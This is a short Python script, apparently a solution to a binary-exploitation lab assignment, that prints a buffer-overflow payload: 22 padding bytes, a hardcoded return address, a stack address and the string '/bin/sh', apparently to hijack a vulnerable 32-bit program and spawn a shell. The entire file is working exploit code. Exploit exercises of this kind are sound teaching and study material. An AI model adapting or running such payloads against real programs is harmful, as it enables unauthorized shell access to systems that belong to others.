#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"a" * 22)
sys.stdout.buffer.write(pack("<I", 0x080488b3))
sys.stdout.buffer.write(pack("<I", 0xfffe8da4))
sys.stdout.buffer.write(b"/bin/sh")
